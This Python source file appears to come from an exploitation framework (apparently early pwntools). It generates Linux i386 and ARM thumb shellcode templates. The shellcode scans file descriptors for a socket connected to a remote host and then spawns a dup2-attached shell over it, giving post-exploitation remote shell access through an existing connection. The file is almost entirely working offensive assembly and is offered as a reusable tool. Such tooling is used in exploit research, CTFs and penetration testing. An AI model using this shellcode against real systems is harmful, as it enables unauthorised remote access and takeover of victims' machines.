from pwn.internal.shellcode_helper import *
from .. import dupsh, pushstr

@shellcode_reqs(arch=['i386', 'thumb'], os='linux', network=['ipv4', 'ipv6'])
def findpeerremotesh(clear_direction_flag = False, paranoid = False, os=None, arch=None):
    """
    Finds an open socket which connects to a remote host,
    and then opens a dup2 shell on it."""
    if arch == 'i386':
       return _findpeerremote_linux_i386(clear_direction_flag, paranoid), dupsh("edx")
    elif arch == 'thumb':
        return _findpeerremote_linux_thumb(), dupsh()
    else:
        no_support('findpeerremotesh', os, arch)

@shellcode_reqs(arch=['i386', 'thumb'], os='linux', network=['ipv4', 'ipv6'])
def findpeerremote(clear_direction_flag = False, paranoid = False, network = None, arch = None):
    """
    Finds a remote socket, which has different ips at each end of the socket.
    Leaves socket:
    i386: EDX
    thumb: r6

    ----- i386 below only ----
    Set clear_direction_flag to True, if the direction flag is set when this
    code is run (not likely).

    Set to paranoid to True if you suspect there is a socket with
    a size larger than 40 bytes just before the socket you are looking for.
    It costs an extra byte in the shellcode.
    """
    if arch == 'i386':
       return _findpeerremote_linux_i386(clear_direction_flag, paranoid, network)
    elif arch == 'thumb':
        return _findpeerremote_linux_thumb()
    else:
        no_support('findpeerremote', os, arch)

def _findpeerremote_linux_thumb():
    mov_sys_socket = pwn.shellcode.mov('r7', 287, raw = True)
    out = """
        eor r6, r6
        sub r6, #1
        mov lr, sp

      findpeer:
        %(mov_sys_socket)s

        /* Hold fd in r6 */
        add r6, #1

        /* reset stack */
        mov sp, lr

        /* Make some room on the stack */
        push {r0, r2, r3, r4}
        
        mov r4, sp

      twice:
        
        mov r5, sp

        mov r0, r6
        mov r1, sp
        push {r7}
        mov r2, sp
        
        sub sp, #32
        
        svc 1

        ldrh r3, [r5]
        sub r3, #2
        bne findpeer

        sub r7, #1
        cmp r4, r5
        
        beq twice
        
        mov r0, #8

      cmploop:
        ldr r1,[r4]
        ldr r2,[r5]
        cmp r1, r2

        bne foundpeer

        add r4, #4
        add r5, #4
        lsr r0, #1
       
        beq findpeer

        b cmploop

      foundpeer:
        /* stupid arm nop for padding */
        mov r1, r1
        """ % {'mov_sys_socket': mov_sys_socket}

    return out

def _findpeerremote_linux_i386(clear_direction_flag, paranoid, network):

    cld = 'cld' if clear_direction_flag else '; cld'

    if network == 'ipv4':
        af = 'AF_INET'
        extra = ''
        if paranoid:
            length_push = 'push 8'
        else:
            length_push = 'push eax'
    elif network == 'ipv6':
        af = 'AF_INET6'
        extra = 'push 4\npop ecx\nrepe cmpsd'
        if paranoid:
            length_push = 'pushad\npush 28'
        else:
            length_push = 'pushad\npush eax'
    else:
        bug('Network was neither ipv4 or ipv6')

    return """

findpeerremote:
    mov ebp, esp

    ; This sets edx to -1 or -2. We don't really care as long as it's slightly below 0.
    cdq
    dec edx

    ; We possibly need to clear direction flag
    %s

.loop:
    ; next file descriptor please
    inc edx

    ; reset stack
    mov esp, ebp

    ; make room for a sockaddr_in/sockaddr_in6
    pushad

    ; Sets up ebx for syscall.
    ; Also some fiddling to make edi = esi on the first pass
    push SYS_socketcall_getpeername
    mov edi, esp
    pop ebx

    ; This next block is run twice. Once for getpeername, once for getsockname
    ; The stack is not popped between runs (on purpose)
.twice:

    ; Set eax = SYS_socket
    push SYS_socketcall
    mov esi, esp
    pop eax

    %s

    push esp
    push esi
    push edx
    mov ecx, esp

    pushad
    int 0x80
    popad

    cmp byte [esi], %s
    jne .loop

    dec ebx             ; SYS_socketcall_getsockname == SYS_socketcall_getpeername - 1
    cmp edi, esi
    je .twice

    cmpsd
    cmpsd

    %s

    je .loop
""" % (cld, length_push, af, extra)
